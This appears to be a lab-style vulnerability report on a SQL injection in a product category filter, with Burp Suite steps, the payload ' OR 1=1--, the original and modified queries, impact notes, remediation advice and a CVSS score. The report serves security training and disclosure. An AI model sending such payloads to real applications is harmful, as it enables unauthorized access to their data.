# SQL Injection in WHERE Clause Allowing Retrieval of Hidden Data

## Description
The application is vulnerable to SQL Injection in the product category filter. User input is directly incorporated into a SQL query without proper sanitization or parameterized statements, allowing attackers to retrieve hidden or unreleased products.

## Steps to Exploit
1. Navigate to the product listing page.
2. Select any product category.
3. Intercept the request using Burp Suite.
4. Modify the `category` parameter to:
   ```sql
   ' OR 1=1--
   ```
5. Forward the request.
6. Observe that all products, including unreleased items, are displayed.

## Proof of Concept

### Payload
```sql
' OR 1=1--
```

### Original Query
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

### Modified Query
```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```

## Impact
- Unauthorized access to hidden or unreleased products.
- Exposure of sensitive business information.
- Increased risk of further SQL Injection exploitation.
- Compromise of application confidentiality.

## Remediation
- Use parameterized queries (prepared statements).
- Implement server-side input validation and allowlisting.
- Apply the principle of least privilege to database accounts.
- Perform regular security assessments and code reviews.

## CVSS Score
**CVSS v3.1: 5.3 (Medium)**

**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`

## CVSS Justification

| Metric | Justification |
|----------|--------------|
| Attack Vector | Exploitable remotely via HTTP requests. |
| Attack Complexity | Low; requires only a simple payload. |
| Privileges Required | None. |
| User Interaction | None. |
| Confidentiality | Low impact due to exposure of hidden product data. |
| Integrity | No impact observed. |
| Availability | No impact observed. |